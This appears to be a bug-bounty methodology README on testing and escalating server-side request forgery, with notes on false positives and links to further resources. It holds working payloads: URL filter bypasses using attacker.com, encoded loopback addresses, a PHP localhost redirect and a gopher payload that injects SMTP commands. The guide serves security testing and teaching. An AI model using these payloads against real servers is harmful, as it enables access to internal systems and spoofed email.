# SSRF
## SSRF Methodology Flowchart
Since I've seen so many people ask what to do once they get a request back to their collaborator instance, I created this flowchart to present what I usually do to test and escalate SSRFs. 
<img src=https://github.com/iustin24/SSRF/blob/main/iustinSSRFflowchart.png>
## False Positives:
DNS queries only are rarely exploitable, and should never be reported without any additional impact.

When using your listener as an email domain `test@burpcollaborator.com`, recieving SMTP + DNS queries are not signs of SSRF. It's just how SMTP works and should never be reported. There's been edge cases where the payload `test@burpcollaborator.com`, lead to http requests. If that's the case, SSRF might be possible. See [d0nut's Piercing the veal](https://medium.com/@d0nut/piercing-the-veal-short-stories-to-read-with-friends-4aa86d606fc5) story 4. 
## Sources: 
### Whitelist filter bypasses
Some common whitelist filter bypasses I test against:
```
https://target.com@attacker.com
https://attacker.com/target.com
https://target.com.attacker.com
```
### Blacklist filter bypasses (decimal, hex, octal)
Inspired from [EdOverflow's blogpost on exploiting Ruby's Resolv](https://edoverflow.com/2017/ruby-resolv-bug/)  
http://0177.1:22/  
http://0x7f.1:22/  
http://127.000.001:22/  
See more at [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

### PHP Redirect
The value appended to location will be the url your page will redirect to. You can also play around with different status codes other than 301, such as 302,303,307.
```
<?php
header("Location: http://127.0.0.1", TRUE, 301);
exit();
?>
```
### SMPT Gopher payloads
Inspired from [d0nut's Piercing the veal](https://medium.com/@d0nut/piercing-the-veal-short-stories-to-read-with-friends-4aa86d606fc5) 
```
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```
Payload taken from [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
### Exploiting incosistencies in url parsers + DNS Rebdinding
Orange Tsai's blackhat presentation explains this perfectly. ( 
[PDF slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) + 
[Youtube presentation](https://www.youtube.com/watch?v=R9pJ2YCXoJQ&ab_channel=BlackHat) )  
Liveoverflow's video ([PHP include and bypass SSRF protection with two DNS A records ](https://www.youtube.com/watch?v=PKbxK2JH23Y&ab_channel=LiveOverflow)) discusses url parsing incosistencies, and also touches on DNS Rebinding.
### More SSRF Resources
[Jdonsec's list of SSRF Resources](https://github.com/jdonsec/AllThingsSSRF)
